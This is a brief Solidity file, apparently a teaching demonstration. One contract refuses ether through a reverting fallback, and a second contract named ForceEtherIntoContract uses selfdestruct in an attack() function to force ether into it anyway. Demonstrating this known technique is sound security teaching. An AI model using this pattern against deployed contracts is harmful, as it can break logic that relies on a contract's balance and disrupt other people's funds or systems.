// own work
pragma solidity ^0.4.23;

contract NeverReceivesEther {
    function () payable public { revert(); }
    
    function balance() public returns (uint) {
        return address(this).balance;
    }
}

contract ForceEtherIntoContract {
    function attack(address victim) payable public {
        selfdestruct(victim);
    }
}
